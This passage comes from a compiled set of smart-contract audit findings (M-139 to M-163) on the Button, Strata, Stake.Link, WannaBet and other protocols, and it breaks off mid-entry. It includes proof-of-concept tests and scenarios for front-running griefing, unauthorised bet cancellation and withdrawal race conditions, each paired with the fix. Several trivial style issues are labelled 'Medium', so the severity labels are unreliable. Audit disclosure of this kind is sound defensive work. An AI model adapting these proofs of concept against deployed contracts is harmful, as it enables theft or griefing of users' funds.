* implemented the "rescue" mechanism in `_withdraw` when all non-dead shares are burned while there is a positive unvested amount, the positive unvested amount gets sent to the owner

**Cyfrin:** Verified though ideally the [transfer](https://github.com/SyntetikaLabs/monorepo/blob/audit/issuance/src/vault/StakingVault.sol#L387) in `StakingVault::_withdraw` would use `safeTransfer` instead of `transfer`.

\clearpage

## [M-139] Redundant `approve(0)` in `Basis Trade Vault::deposit To Tailor`
- Severity: `Medium`
- Source report: `trade.md`

### Detailed Content (from source)
**Description:** `BasisTradeVault::depositToTailor` grants `tailor` an allowance, calls `tailor.deposit(pocket, amount)`, and then sets the allowance back to zero:

```solidity
IERC20(asset()).forceApprove(address(tailor), amount);
tailor.deposit(pocket, amount);
IERC20(asset()).forceApprove(address(tailor), 0); // redundant
```

`BasisTradeTailor::deposit` pulls exactly `amount` via `safeTransferFrom(msg.sender, pocket, amount)`, which consumes the entire allowance. With a standard ERC20, the post-call allowance is already `0`, so the trailing `forceApprove(..., 0)` performs an unnecessary storage write and external call.

Consider removing the final zeroing call.

**Button:** Fixed in commit [`9d8ed75`](https://github.com/buttonxyz/button-protocol/commit/9d8ed75bd5ed4957c7b23f9b06ff362b7bb218a4)

**Cyfrin:** Verified.

\clearpage

## [M-140] Redundant variable statements
- Severity: `Medium`
- Source report: `trade.md`

### Detailed Content (from source)
**Description:** In `BasisTradeVault` the functions `maxMint`, `mint`, `withdraw`, and `redeem` are overrides of the standard ERC4626 interface. In this contract, these functions are intentionally disabled to enforce a custom deposit and withdrawal flow (e.g., using `requestWithdraw` and `requestRedeem` instead of the standard `withdraw` and `redeem`).

Because these functions are disabled and immediately revert or return a fixed value, their parameters (`receiver`, `shares`, `assets`, `owner`) are not used within the function bodies. The code explicitly acknowledges this by placing the parameter names on their own lines (e.g., `receiver;`), which silences compiler warnings about unused variables but is redundant.

**Recommended Mitigation:** An alternative way to denote unused parameters, which can improve clarity, is to write the function declarations without the parameters (e.g., `foo(uint256, address)`). This is a common convention in Solidity to signal that a parameter is intentionally unused.

```solidity
// ...existing code...
    /**
     * @notice Mint function is disabled
     * @dev This vault only supports asset-based deposits
     */
    function mint(uint256 /*shares*/, address /*receiver*/) public virtual override returns (uint256) {
        revert("Mint disabled: use deposit");
    }

    // ============================================
// ...existing code...
    /**
     * @notice Standard withdraw function is disabled
     * @dev Users must use requestWithdraw instead
     */
    function withdraw(
        uint256 /*assets*/,
        address /*receiver*/,
        address /*owner*/
    ) public virtual override returns (uint256) {
        revert("Withdraw disabled: use requestWithdraw");
    }

    /**
     * @notice Standard redeem function is disabled
     * @dev Users must use requestRedeem instead
     */
    function redeem(
        uint256 /*shares*/,
        address /*receiver*/,
        address /*owner*/
    ) public virtual override returns (uint256) {
        revert("Redeem disabled: use requestRedeem");
    }

// ...existing code...
    /**
     * @notice Returns the maximum shares that can be minted
     * @dev Always returns 0 as mint is disabled
     * @param receiver Address that would receive the shares
     * @return Always 0 (mint disabled)
     */
    function maxMint(address /*receiver*/) public view virtual override returns (uint256) {
        return 0; // Mint is disabled
    }
}
```

**Button:** FIxed in commit [`9d8ed75`](https://github.com/buttonxyz/button-protocol/commit/9d8ed75bd5ed4957c7b23f9b06ff362b7bb218a4)

**Cyfrin:** Verified.

## [M-141] Use named mapping parameters to explicitly note the purpose of keys and values
- Severity: `Medium`
- Source report: `trade.md`

### Detailed Content (from source)
**Description:** Use named mapping parameters to explicitly note the purpose of keys and values:

* [`BasisTradeTailor`](https://github.com/buttonxyz/button-protocol/blob/9002f2b0d05ba80039bd942c809dbe5bc1a252c9/src/BasisTradeTailor.sol#L41-L47)
  ```solidity
  // Mappings
  /// @notice Maps pocket address to the user who controls it
  mapping(address => address) public pocketUser;
  /// @notice Tracks pending withdrawal amounts for each pocket
  mapping(address => uint256) public withdrawalRequests;
  /// @notice Whitelist of addresses allowed to create pockets
  mapping(address => bool) public creationWhitelist;
  ```

* [`BasisTradeVault`](https://github.com/buttonxyz/button-protocol/blob/9002f2b0d05ba80039bd942c809dbe5bc1a252c9/src/BasisTradeVault.sol#L80):
  ```solidity
  mapping(address => bool) public depositWhitelist;
  ```

* [`PocketFactory`](https://github.com/buttonxyz/button-protocol/blob/9002f2b0d05ba80039bd942c809dbe5bc1a252c9/src/PocketFactory.sol#L28):
  ```solidity
  mapping(address => bool) public approvedTailors;
  ```

**Button:** Fixed in commit [`a9ba276`](https://github.com/buttonxyz/button-protocol/commit/a9ba276e0536c38f8a89fb1105ca7f3a0d918519)

**Cyfrin:** Verified.

## [M-142] Withdrawals priced at execution problematic during large price swings
- Severity: `Medium`
- Source report: `trade.md`

### Detailed Content (from source)
**Description:** Withdrawals are “price-locked” at request time: `requestRedeem` stores `shares` and the computed `assetsAfterFee = previewRedeem(shares)` using the at-request exchange rate. When an agent later calls `processWithdrawal`, the vault burns the escrowed `shares` but pays out the stored asset amount, not what those shares are worth at execution.

**Impact:** If the share price has fallen in the interim (e.g., oracle update, Core PnL loss, depeg), early requesters are effectively overpaid relative to the current price, with the shortfall socialized to remaining shareholders. In extreme drawdowns this can accelerate bank-run dynamics and drain the vault faster than intended possibly to the point of insolvency.

**Recommended Mitigation:** Consider using price at execution. Store only `shares` at request time and compute `assetsAfterFee` at processing using the current exchange rate (i.e., `previewRedeem(shares)` then). Possibly with execution guardrails with acceptable slippage bounds (protocol default and/or user-provided).

**Button:** Fixed in commit [`9cde24c`](https://github.com/buttonxyz/button-protocol/commit/9cde24caa4b3f5f37a059bb2fde172cfa374d3a9) by moving to pricing at execution.

**Cyfrin:** Verified. Price now taken at execution.

## [M-143] Misleading variable name to set the `asset` for the `Tranche`
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** The variable that is used to set the `asset` the `Tranche` will work with is named `stakedAsset`.
This is misleading because the two assets the system works with are `USDe` and `sUSDe`. ' sUSDe is the staked version of `USDe`, so the variable name can mislead people into thinking that the `asset` of the `Tranche` is expected to be `sUSDe` instead of `USDe`.

**Recommended Mitigation:** Rename the variable name to `baseAsset` or another name that doesn't have the word `stake` in the name.

**Strata:**
Fixed in commit [2d7f5a17](https://github.com/Strata-Money/contracts-tranches/commit/2d7f5a17e0ac1545506530e8ed85cad828f392f6).

**Cyfrin:** Verified.

## [M-144] Missing `Unstaked` event for immediate unstake in `Unstake Cooldown::transfer`
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** When `UnstakeCooldown::transfer` triggers an immediate unstake (i.e. the handler’s call to `proxy.request()` returns `unlockAt <= block.timestamp`), the function returns early after returning the proxy to the pool — but it does not emit the `Unstaked` event for that immediate completion. As a result an on‑chain event is missing for the flow where the redemption happened immediately (no cooldown).

**Impact:** Off-chain systems relying on events for tracking withdrawals may miss these immediate unstake operations. This does not affect on-chain balances or security, and users still receive their funds correctly.

**Recommended Mitigation:** Emit an `Unstaked` (or create a new `ImmediateUnstake`) event in the `transfer()` immediate branch using the `amount` parameter passed to `transfer()`.

**Strata:**
Fixed in commit [c08784](https://github.com/Strata-Money/contracts-tranches/commit/c087849442937e8465f342f9ec6dc82ac4897d0a) by unifying the event being emitted in both cooldown contracts as `Finalized`

**Cyfrin:** Verified.

## [M-145] `Basis Trade Tailor::transfer Perp` comment mismatch
- Severity: `Medium`
- Source report: `update.md`

### Detailed Content (from source)
**Description:** `BasisTradeTailor::transferPerp` NatSpec comment states "(agent only)" but the function uses `onlyEngine` modifier:

```solidity
// BasisTradeTailor.sol:373-378
/**
 * @notice Transfer funds between spot and perp accounts on HyperCore (agent only)
 */
function transferPerp(address pocket, uint64 amount, bool toPerp) external onlyEngine {
    // Comment says "agent only" but modifier is onlyEngine
```

The code implementation is likely correct since `ENGINE_ROLE` can call only this function, making the comment misleading.

**Recommended Mitigation:** Update the comment to match the implementation:

```diff
/**
- * @notice Transfer funds between spot and perp accounts on HyperCore (agent only)
+ * @notice Transfer funds between spot and perp accounts on HyperCore (engine only)
 * @param pocket Address of the pocket
 * @param amount Amount to transfer
 * @param toPerp True to transfer to perp, false to transfer to spot
 */
function transferPerp(address pocket, uint64 amount, bool toPerp) external onlyEngine {
```

**Button:** Fixed in commit [`b74a07d`](https://github.com/buttonxyz/button-protocol/commit/b74a07db825a07098bf83e06f9467308d9f0a211)

**Cyfrin:** Verified.

## [M-146] `Basis Trade Tailor` withdrawal request overwrite enables race conditions
- Severity: `Medium`
- Source report: `update.md`

### Detailed Content (from source)
**Description:** The `BasisTradeTailor::requestWithdrawal` function unconditionally overwrites any existing withdrawal request:

```solidity
// BasisTradeTailor.sol:556-560
function requestWithdrawal(address pocket, uint256 amount) external onlyPocketUser(pocket) {
    withdrawalRequests[pocket] = amount;  // Overwrites existing request
    emit WithdrawalRequested(pocket, amount);
}
```

There is no validation to prevent overwrites or explicit cancellation mechanism. Users attempting to modify their withdrawal amount create race conditions with the agent's `processWithdrawal()` calls.

**Impact:** Transaction ordering between user's `requestWithdrawal()` and agent's `processWithdrawal()` determines whether the request is replaced or accumulated, leading to users withdrawing more than intended.

When users call `requestWithdrawal()` to modify an existing request, they expect the new amount to **replace** the old amount. However, if the agent processes the original request first, the user's second call creates a **new** request instead of replacing the original, resulting in both amounts being withdrawn.

**Proof of Concept:**
```
Block N:
  User: requestWithdrawal(pocket, 100 baseAsset)
  withdrawalRequests[pocket] = 100

User realizes they want only 50 total, submits modification:

Block N+1 (both transactions in same block):
  User: requestWithdrawal(pocket, 50)    // User wants to REPLACE 100 with 50
  Agent: processWithdrawal(pocket, 100)  // Agent processes original request

Outcome depends on transaction order within block:

Case 1 - User tx executes first:
  1. withdrawalRequests[pocket] = 50 (replaced)
  2. Agent processes 50 baseAsset
  3. withdrawalRequests[pocket] = 0
  4. Result: User withdraws 50 total

Case 2 - Agent tx executes first:
  1. Agent processes 100 baseAsset, sets withdrawalRequests[pocket] = 0
  2. User sets withdrawalRequests[pocket] = 50 (creates NEW request)
  3. Agent later processes this 50 baseAsset request
  4. Result: User withdraws 150 total (100 + 50)

In Case 2, the user wanted to reduce their total withdrawal to 50 but received 150 due to transaction ordering.
```

Similar issue occurs when users call `requestWithdrawal(0)` to cancel - if the agent processes first, the full amount is withdrawn before cancellation takes effect.

**Recommended Mitigation:** Prevent changing from non-zero to non-zero by requiring explicit cancellation first. Add a separate `cancelWithdrawal()` function to set the request to zero:

```solidity
function requestWithdrawal(address pocket, uint256 amount) external onlyPocketUser(pocket) {
    require(amount > 0, "Amount must be positive");
    require(withdrawalRequests[pocket] == 0, "Cancel existing request first");

    withdrawalRequests[pocket] = amount;
    emit WithdrawalRequested(pocket, amount);
}

function cancelWithdrawal(address pocket) external onlyPocketUser(pocket) {
    uint256 currentRequest = withdrawalRequests[pocket];
    require(currentRequest > 0, "No pending request");

    withdrawalRequests[pocket] = 0;
    emit WithdrawalCancelled(pocket, currentRequest);
}
```

This prevents overwrites (cannot go from 100 → 50 directly) and makes cancellation explicit (must call `cancelWithdrawal()` to set to zero, cannot use `requestWithdrawal(0)`).

**Button:** FIxed in commit [`2aa92eb`](https://github.com/buttonxyz/button-protocol/commit/2aa92ebd0912eac61451767364cc31fd2671d8fc)

**Cyfrin:** Verified. Recommendation implemented.


\clearpage

## [M-147] `Poket Factory` is ERC-165 non compilant
- Severity: `Medium`
- Source report: `update.md`

### Detailed Content (from source)
**Description:** `PocketFactory` implements `IPocketFactory` but `supportsInterface()` doesn't check for it:

```solidity
// PocketFactory.sol:93-100
function supportsInterface(bytes4 interfaceId)
    public view override(AccessControlEnumerable) returns (bool)
{
    return super.supportsInterface(interfaceId);  // doesn't check IPocketFactory
}
```

This violates ERC-165 standard. Calling `pocketFactory.supportsInterface(type(IPocketFactory).interfaceId)` returns `false` even though the contract implements the interface.

**Recommended Mitigation:** Check for `IPocketFactory` interface explicitly:

```diff
function supportsInterface(bytes4 interfaceId)
    public view override(AccessControlEnumerable) returns (bool)
{
-   return super.supportsInterface(interfaceId);
+   return
+       interfaceId == type(IPocketFactory).interfaceId ||
+       super.supportsInterface(interfaceId);
}
```

**Button:** Fixed in commit [`b74a07d`](https://github.com/buttonxyz/button-protocol/commit/b74a07db825a07098bf83e06f9467308d9f0a211)

**Cyfrin:** Verified.

## [M-148] Upgrade script deploys implementation but doesn't execute upgrade
- Severity: `Medium`
- Source report: `update.md`

### Detailed Content (from source)
**Description:** The `UpgradeBasisTradeTailor.s.sol` script deploys a new implementation but doesn't execute the actual upgrade - line 44 is commented out.

```solidity
// UpgradeBasisTradeTailor.s.sol:38-48
// Deploy new implementation
BasisTradeTailor newImpl = new BasisTradeTailor(hypeTokenIndex, usdcAddress, coreDepositWallet);
console.log("New implementation deployed at:", address(newImpl));
console.log("HYPE Token Index:", hypeTokenIndex);
console.log("USDC Address:", usdcAddress);
console.log("CoreDepositWallet:", coreDepositWallet);

//tailor.upgradeToAndCall(address(newImpl), "");  // Commented out

vm.stopBroadcast();

console.log("\n=== Tailor Upgraded ===");  // Misleading - upgrade didn't happen
```

The script logs "Tailor Upgraded" but the proxy still points to the old implementation. The `runSafe()` function (lines 60-83) suggests upgrades are meant for Gnosis Safe, but the `run()` function's behavior could confuse operators expecting a complete upgrade.

**Recommended Mitigation:** Either uncomment line 44 to execute the upgrade, or update documentation and console logs to clarify this is "deploy-only" mode and upgrade must be executed separately via Safe or manual `upgradeToAndCall()`.

**Button:** Fixed in commit [`b74a07d`](https://github.com/buttonxyz/button-protocol/commit/b74a07db825a07098bf83e06f9467308d9f0a211)

**Cyfrin:** Verified.

## [M-149] `SDLVesting::claim RESDLRewards()` can be used to drain the entire vesting contract balance in edge case
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** The `SDLVesting::claimRESDLRewards` function transfers the entire token balance to the beneficiary for each specified reward token. If the admin mistakenly adds SDL token as a reward token in the `RewardsPoolController`, the beneficiary could call `SDLVesting::claimRESDLRewards([sdlToken])` to instantly drain all vested and unvested SDL tokens from the contract, completely bypassing the vesting schedule.

```solidity
    function claimRESDLRewards(address[] calldata _tokens) external onlyBeneficiary {
        sdlPool.withdrawRewards(_tokens);

        for (uint256 i = 0; i < _tokens.length; ++i) {
            IERC20 token = IERC20(_tokens[i]);
            uint256 balance = token.balanceOf(address(this));

            if (balance != 0) {
                token.safeTransfer(beneficiary, balance);
            }
        }
    }
```
This happens because the entire `token.balanceOf(address(this));` is transferred to the beneficiary.

Consider adding a check to prevent SDL token from being claimed as a reward:

```diff
function claimRESDLRewards(address[] calldata _tokens) external onlyBeneficiary {
    sdlPool.withdrawRewards(_tokens);

    for (uint256 i = 0; i < _tokens.length; ++i) {
+       if (_tokens[i] == address(sdlToken)) continue; // Skip SDL token

        IERC20 token = IERC20(_tokens[i]);
        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) {
            token.safeTransfer(beneficiary, balance);
        }
    }
}
```

**Stake.Link:** Fixed in commit [`e458512`](https://github.com/stakedotlink/contracts/commit/e4585124c05137848196d4ca759c3e9d28b963e1)

**Cyfrin:** Verified. `_tokens[i]` now checked to not be equal to `sdlToken`.

## [M-150] Missing access control in `SDLVesting::stake Releasable Tokens`
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** The [`SDLVesting::stakeReleasableTokens`](https://github.com/stakedotlink/contracts/blob/3462c0d04ff92a23843adf0be8ea969b91b9bf0c/contracts/vesting/SDLVesting.sol#L108) function is meant to be driven by a trusted staking bot, run by the Stake.Link team, to periodically take any newly-vested SDL and lock it into the SDLPool under the beneficiary’s chosen duration. However, it currently has no access control.

Thus anyone can call `SDLVesting::stakeReleasableTokens`. Using this an attacker can front run calls to `SDLVesting::release` by locking the beneficiaries tokens.

**Impact:** An adversary can repeatedly deny the beneficiary access to vested tokens by front running their `release()` transactions.

**Proof of Concept:**
```javascript
  it('should prevent griefing attacks', async () => {
      const { signers, accounts, start, vesting, sdlPool, sdlToken } = await loadFixture(deployFixture)

      await vesting.connect(signers[1]).setLockTime(4) // 4-year lock
      await time.increase(DAY)

      const releasableAmount = await vesting.releasable()
      console.log("Tokens victim wanted as liquid:", fromEther(releasableAmount), "SDL")

      await vesting.stakeReleasableTokens() //Someone frontruns and forces staking
      const lockIdAfter = await sdlPool.lastLockId()
      console.log("Frontrun with `stakeReleasableTokens`, position created with ID:", lockIdAfter.toString())
      console.log("Position owner:", await sdlPool.ownerOf(lockIdAfter), "(vesting contract)")

      // Get the staking position details
      const locks = await sdlPool.getLocks([lockIdAfter])
      const lock = locks[0]

      const currentTime = await time.latest()
      const lockDuration = Number(lock.duration)
      const unlockInitiationTime = Number(lock.startTime) + lockDuration / 2
      const fullUnlockTime = Number(lock.startTime) + lockDuration

      console.log("Base SDL staked:", fromEther(lock.amount), "SDL")
      console.log("Boost received:", fromEther(lock.boostAmount), "SDL")
      console.log("Total effective staking power:", fromEther(lock.amount + lock.boostAmount), "SDL")
      console.log("Lock duration:", lockDuration / (365 * 86400), "years")

      console.log("Years until unlock initiation allowed:", (unlockInitiationTime - currentTime) / (365 * 86400))
      console.log("Years until full withdrawal possible:", (fullUnlockTime - currentTime) / (365 * 86400))

      // Victim has almost no liquid tokens
      await vesting.connect(signers[1]).release() // Get the tiny remainder
      const victimLiquidBalance = await sdlToken.balanceOf(accounts[1])
      console.log("Victim's liquid balance:", fromEther(victimLiquidBalance), "SDL (instead of", fromEther(releasableAmount), "SDL)")

      // Victim transfers position to themselves, but it's still locked
      console.log("Transferring position to beneficiary...")
      await vesting.connect(signers[1]).withdrawRESDLPositions([4])
      console.log("Position now owned by:", await sdlPool.ownerOf(lockIdAfter))

      try {
        await sdlPool.connect(signers[1]).initiateUnlock(lockIdAfter)
        console.log("UNEXPECTED: Immediate unlock initiation succeeded!")
      } catch (error) {
        console.log("EXPECTED: Beneficiary cannot initiate unlock yet")
        console.log("Must wait 2 years before unlock can even be INITIATED, and another 2 years for full withdrawal")
      }
    })
```


**Recommended Mitigation:**
1. Introduce a `stakingBot` address that is the only non-beneficiary permitted to call the staking function:

   ```diff
   +    /// @notice Address of the trusted bot allowed to call stakeReleasableTokens
   +    address public stakingBot;
   ```

2. Set it in the constructor alongside `_owner` and `_beneficiary`:

   ```diff
       constructor(
           address _sdlToken,
           address _sdlPool,
           address _owner,
           address _beneficiary,
   +       address _stakingBot,
           uint64 _start,
           uint64 _duration,
           uint64 _lockTime
       ) {
           _transferOwnership(_owner);
   +       stakingBot = _stakingBot;
           …
       }
   ```

3. Create a combined access-control modifier allowing only the beneficiary *or* the staking bot:

   ```diff
   +    modifier onlyBeneficiaryOrBot() {
   +        if (msg.sender != beneficiary && msg.sender != stakingBot) {
   +            revert SenderNotAuthorized();
   +        }
   +        _;
   +    }
   ```

4. Apply that modifier to `stakeReleasableTokens()`:

   ```diff
   -    function stakeReleasableTokens() external {
   +    function stakeReleasableTokens() external onlyBeneficiaryOrBot {
           uint256 amount = releasable();
           if (amount == 0) revert NoTokensReleasable();
           …
       }
   ```

5. In case the bot’s key rotates or the Stake.Link team needs to change the automation address, add an owner-only setter:

   ```diff
   +    /// @notice Update the trusted staking bot address
   +    function setStakingBot(address _stakingBot) external onlyOwner {
   +        require(_stakingBot != address(0), "Invalid bot address");
   +        stakingBot = _stakingBot;
   +    }
   ```

With these changes, only the designated bot (and the beneficiary themselves, if desired) can trigger the periodic staking—eliminating the griefing vector that could otherwise lock tokens indefinitely.

**Stake.Link:** Fixed in commit [`565b043`](https://github.com/stakedotlink/contracts/commit/565b043b98f6b0a61a9eda9b7f2ca20ecdac8598)

**Cyfrin:** Verified. An address `staker` is now passed to the constructor. And a modifier `onlyBeneficiaryOrStaker` is applied to `stakeReleasableTokens`.

\clearpage

## [M-151] Duplicated `Math` import should be removed from `ERC721Wrapper Base`
- Severity: `Medium`
- Source report: `vii.md`

### Detailed Content (from source)
**Description:** The OpenZeppelin `Math` library is imported twice in `ERC721WrapperBase`, so one instance can be removed.

**VII Finance:** Fixed in commit [e60cf39](https://github.com/kankodu/vii-finance-smart-contracts/commit/e60cf39ca4e11eb198e6d65b47803f6bf9cd018c).

**Cyfrin:** Verified. The duplicate import has been removed.

\clearpage

## [M-152] Active and pending bets can be cancelled by anyone
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** [`Bet::cancel`](https://github.com/gskril/wannabet-v2/blob/d7333369548874cb99e9648ea2424ac1e67cc23f/contracts/src/Bet.sol#L163-L176) allows any address (except the maker) to cancel a bet while it is in the `ACTIVE` or `PENDING` state:

```solidity
/// @dev Anybody can cancel an expired bet and send funds back to each party. The maker can cancel a pending bet.
function cancel() external {
    IBet.Bet memory b = _bet;

    // Can't cancel a bet that's already completed
    if (b.status >= IBet.Status.RESOLVED) {
        revert InvalidStatus();
    } else {
        // Pending or active bets at this point
        // The maker can cancel a pending bet, so block them from cancelling an active bet
        // @audit-issue this only prevents `maker` from cancelling, anyone including the taker can cancel an active bet
        if (b.maker == msg.sender && b.status != IBet.Status.PENDING) {
            revert InvalidStatus();
        }
    }
```

The logic only prevents the maker from cancelling an `ACTIVE` bet or anyone from cancelling after the bet has reached a final state. In practice, this means any arbitrary address (including the `taker`) can cancel both `PENDING` and `ACTIVE` bets at any time.

**Impact:** Allowing any user to cancel a bet enables griefing and, more critically, lets the taker unilaterally back out of a bet they have already accepted. For example, in a sports bet, once the taker observes that their side is likely to lose, they can simply call `cancel()` to unwind the bet and reclaim their stake, undermining the integrity of the betting mechanism.

**Proof of Concept:** Add following test to `BetFactory.t.sol` which shows that the `taker` can cancel a non-expired `ACTIVE` bet:

```solidity
// Anyone can cancel a non-expired ACTIVE bet
function test_ActiveBetCanBeCancelledByAnyone() public {
    // 1. Have the taker accept the bet so it becomes ACTIVE
    vm.startPrank(taker);
    usdc.approve(address(betNoPool), 1000);
    betNoPool.accept();
    vm.stopPrank();

    // Sanity check: bet is ACTIVE
    assertEq(uint(betNoPool.bet().status), uint(IBet.Status.ACTIVE));

    // 2. Warp to a time before resolveBy so the bet is still non-expired
    IBet.Bet memory state = betNoPool.bet();
    vm.warp(uint256(state.resolveBy) - 1);
    assertEq(uint(betNoPool.bet().status), uint(IBet.Status.ACTIVE));

    uint256 makerBalanceBefore = usdc.balanceOf(maker);
    uint256 takerBalanceBefore = usdc.balanceOf(taker);

    // 3. taker cancels the bet
    vm.prank(taker);
    betNoPool.cancel();

    // 4. After cancellation, the bet is marked CANCELLED and funds are refunded
    assertEq(uint(betNoPool.bet().status), uint(IBet.Status.CANCELLED));
    assertEq(usdc.balanceOf(maker) - makerBalanceBefore, 1000);
    assertEq(usdc.balanceOf(taker) - takerBalanceBefore, 1000);
}
```

**Recommended Mitigation:** Consider not allowing anyone to cancel the bet once it's active, alternatively, only allow the judge to cancel active bets.

**WannaBet:** Fixed in commit [cdf3d64](https://github.com/gskril/wannabet-v2/commit/cdf3d649ab818b67e26b82eb241013adbbcdf473).

**Cyfrin:** Verified.

## [M-153] In `Bet::accept,resolve,cancel` update `Bet` state prior to external calls
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** It is wise to follow the Checks-Effects-Interactions [[1](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html), [2](https://docs.soliditylang.org/en/v0.6.11/security-considerations.html)] pattern; in `Bet::accept,resolve,cancel` the following storage updates should occur prior to making external calls:
```solidity
// `Bet::accept`
_bet.status = IBet.Status.ACTIVE;

// `Bet::resolve`
_bet.winner = winner;
_bet.status = IBet.Status.RESOLVED;

// `Bet::cancel`
_bet.status = IBet.Status.CANCELLED;
```

**WannaBet:** Fixed in commit [5cda880](https://github.com/gskril/wannabet-v2/commit/5cda88027d6081007642caf56dae49af5d753f41).

**Cyfrin:** Verified.

## [M-154] In `Bet::cancel` if one transfer reverts but the other succeeds, one users's tokens are permanently locked in the `Bet` contract
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** `Bet::cancel` does this when refunding token transfers:
```solidity
try IERC20(b.asset).transfer(b.maker, makerRefund) {} catch {}
try IERC20(b.asset).transfer(b.taker, takerRefund) {} catch {}
```

But if one of the `transfer` calls reverts but the other succeeds, the transaction still successfully executes. This:
* moves the bet into the `CANCELLED` state
* keeps one user's tokens inside the `Bet` contract

**Impact:** For the user whose transfer reverted during the cancellation, there is no way for them to withdraw their tokens since `Bet::cancel` can't be called again, the `Bet` contract is immutable and there's no other functions that can rescue the tokens.

**Recommended Mitigation:** The simplest option is to remove the silent `catch` and revert the entire transaction if one of the `transfer` calls reverts; either both users are refunded or neither are.

A more complicated option is when cancelling a bet:
* update storage `Bet::makerStake,takerStake` to deduct the refunded amount if the transfer succeeded
* add a new function that allows the `maker` or `taker` of a given bet to withdraw their tokens if the bet has been cancelled but the `Bet` record shows they didn't receive a refund because the transfer failed.

**WannaBet:** Fixed in commit [f1750a9](https://github.com/gskril/wannabet-v2/commit/f1750a975346b1472ef3306db31f6fc7bd2db3b5).

**Cyfrin:** Verified.

## [M-155] Judge can designate arbitrary winner who is neither maker nor taker
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** When calling `Bet::resolve`, the nominated judge can designate an arbitrary winner to receive the winnings.

**Impact:** The judge can send the winnings to themselves or to any other non-related party who didn't participate in the bet, even though the bet is a contract between the `maker` and `taker`.

**Recommended Mitigation:** `Bet::resolve` should enforce that the winner is either the `maker` or the `taker`.

**WannaBet:** Fixed in commit [74654b5](https://github.com/gskril/wannabet-v2/commit/74654b59cc63c95c5ea8dd31f1e561bf7bd66285).

**Cyfrin:** Verified.

## [M-156] Remove obsolete `return` statements when already using named return variables
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** Remove obsolete `return` statements when already using named return variables:
* `Bet::bet`

**WannaBet:** Fixed in commit [c116182](https://github.com/gskril/wannabet-v2/commit/c11618221162a1010109ece02f2e42bede3350ac).

**Cyfrin:** Verified.

## [M-157] Taker receives Aave yield for cancelled pending bets
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** If a bet uses an Aave pool but never becomes `ACTIVE` (taker never accepts), only the maker’s stake is supplied to Aave. In `Bet::cancel`, the recovered Aave balance is still split using maker/taker logic:
```solidity
uint256 aTokenBalance = IERC20(_aavePool.getReserveAToken(b.asset))
    .balanceOf(address(this));
_aavePool.withdraw(b.asset, aTokenBalance, address(this));

makerRefund = _min(makerRefund, aTokenBalance);
takerRefund = _min(takerRefund, aTokenBalance - makerRefund);
```

So the taker can receive part of the maker’s accrued yield (or recovered principal) despite never having deposited. However this is balanced out by the maker having priority to be refunded, if for example there was a "negative yield" event in Aave which caused the total amount withdrawn from Aave to be less than what was deposited.

Consider whether:
1) the treasury should receive any Aave generated yield when the bet is cancelled
2) if the taker never accepted, whether they should still receive Aave yield

**WannaBet:** Fixed in commit [f1750a9](https://github.com/gskril/wannabet-v2/commit/f1750a975346b1472ef3306db31f6fc7bd2db3b5) such that:
* taker only receives refund if they deposited
* yield is sent either to treasury if it exists or otherwise to the maker

**Cyfrin:** Verified.

## [M-158] Unused error `IBet::Invalid Amount`
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** The custom error `InvalidAmount` is declared in `IBet` but never used anywhere in the implementation. Consider removing it or using it in the amount check it's intended to validate.

**WannaBet:** Fixed in commit [6bddf7f](https://github.com/gskril/wannabet-v2/commit/6bddf7fc0be929fd10ac731ef87cebba9f7ee686).

**Cyfrin:** Verified.

## [M-159] Use `Ownable2Step` instead of `Ownable`
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** Use [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) instead of `Ownable`.

**WannaBet:** Fixed in commit [4fb5f42](https://github.com/gskril/wannabet-v2/commit/4fb5f42f2ffc2ee07706eb47640d137c45d99b63).

**Cyfrin:** Verified.

## [M-160] Use `type(uint256).max` when withdrawing from Aave
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** When unwinding Aave positions in `Bet::resolve` and `cancel`, the contract withdraws using the current aToken balance as the `amount` parameter:
```solidity
uint256 aTokenBalance = IERC20(_aavePool.getReserveAToken(b.asset))
    .balanceOf(address(this));
_aavePool.withdraw(b.asset, aTokenBalance, address(this));
```

Aave’s [recommended pattern](https://aave.com/docs/aave-v3/smart-contracts/pool?utm_source=chatgpt.com#write-methods-withdraw) for fully closing a position is to pass `type(uint256).max`, which is more robust against rounding/indexing edge cases. This also removes one external call as `withdraw` returns the amount withdrawn:
```solidity
uint256 aTokenBalance = _aavePool.withdraw(b.asset, type(uint256).max, address(this));
```

**WannaBet:** Fixed in commit [b060cf6](https://github.com/gskril/wannabet-v2/commit/b060cf65724fc00d54b6440454261f63d662cc57).

**Cyfrin:** Verified.

## [M-161] Use named return variables where this can eliminate local variables
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** Use named return variables where this can eliminate local variables:
* `BetFactory::createBet`
* `Bet::_status`

**WannaBet:** Fixed in commit [1c5fb9d](https://github.com/gskril/wannabet-v2/commit/1c5fb9db92808e9165ba0f13fb600ae4bd9f08f3).

**Cyfrin:** Verified.

## [M-162] Remove obsolete `return` statements when using named returns
- Severity: `Medium`
- Source report: `wlf.md`

### Detailed Content (from source)
**Description:** Remove obsolete `return` statements when using named returns:
* `WorldLibertyFinancialV2::getVotes` - final `return votingPower;` at L260

**WLFI:**
Fixed in commit [b567696](https://github.com/worldliberty/usd1-protocol/blob/b56769613b6438b62b8b4133a63fca727fdbc631/contracts/wlfi/WorldLibertyFinancialV2.sol#L284)

**Cyfrin:** Fixed.

## [M-163] Use `Safe Cast` to safely downcast amounts
- Severity: `Medium`
- Source report: `wlf.md`

